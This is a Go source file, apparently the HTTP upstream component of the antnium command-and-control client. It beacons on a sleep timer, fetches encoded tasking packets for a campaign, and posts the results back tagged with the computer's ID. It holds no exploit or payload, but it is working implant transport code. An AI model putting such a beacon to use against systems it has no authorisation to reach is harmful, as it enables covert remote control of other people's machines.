package client

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"time"

	"github.com/dobin/antnium/pkg/model"
	log "github.com/sirupsen/logrus"
)

type UpstreamHttp struct {
	channel chan model.Packet

	state ClientState
	coder model.Coder

	config   *ClientConfig
	campaign *model.Campaign
}

func MakeUpstream(config *ClientConfig, campaign *model.Campaign) UpstreamHttp {
	coder := model.MakeCoder(*campaign)

	u := UpstreamHttp{
		make(chan model.Packet),
		MakeClientState(),
		coder,
		config,
		campaign,
	}
	return u
}

func (d UpstreamHttp) Channel() chan model.Packet {
	return d.channel
}

func (d UpstreamHttp) SendPacket(packet model.Packet) error {
	// Only used for client-initiated packets
	return d.sendPacket(packet)
}

func (d UpstreamHttp) Start() {
	for {
		// Sleep first
		time.Sleep(d.state.getSleepDuration())

		// Try getting a packet from server
		packet, err := d.GetPacket()
		if err != nil {
			if err == ErrNoPacketsFound {
				fmt.Print(".")
				continue // no packets for us, maybe later
			}

			log.WithFields(log.Fields{
				"error": err,
			}).Debug("Error get packet")

			// Sleep and try again
			continue
		}

		// Notify state that we received a packet
		d.state.gotPacket()

		// Send it to Client
		d.channel <- packet

		// Receive answer from Client
		packet = <-d.channel

		// Send answer back to server
		err = d.sendPacket(packet)
		if err != nil {
			log.WithFields(log.Fields{
				"packet": packet,
				"error":  err,
			}).Info("Error sending packet")
		}
	}
}

func (d UpstreamHttp) GetPacket() (model.Packet, error) {
	url := d.PacketGetUrl()
	resp, err := d.HttpGet(url)
	if err != nil {
		return model.Packet{}, fmt.Errorf("Error requesting URL %s with error %s", url, err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return model.Packet{}, fmt.Errorf("Error status code %d in requesting URL %s", resp.StatusCode, url)
	}
	bodyBytes, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return model.Packet{}, fmt.Errorf("Error reading body of URL %s with error %s", url, err)
	}

	if len(bodyBytes) <= 0 {
		return model.Packet{}, ErrNoPacketsFound
	}
	packet, err := d.coder.DecodeData(bodyBytes)
	if err != nil {
		return model.Packet{}, fmt.Errorf("Error decoding body of URL %s with error %s", url, err)
	}
	return packet, nil
}

func (d UpstreamHttp) sendPacket(packet model.Packet) error {
	url := d.PacketSendUrl()

	// Setup response
	packet.ComputerId = d.config.ComputerId
	json, err := json.Marshal(packet)
	if err != nil {
		return err
	}

	log.WithFields(log.Fields{
		"packet": string(json),
	}).Info("Send Packet")

	data, err := d.coder.EncodeData(packet)
	if err != nil {
		return fmt.Errorf("Could not send answer to URL %s: %s", url, err.Error())
	}

	resp, err := d.HttpPost(url, bytes.NewReader(data))
	if err != nil {
		return fmt.Errorf("Could not send answer to URL %s: %s", url, err.Error())
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("Error status code %d in requesting URL %s", resp.StatusCode, url)
	}

	return nil
}
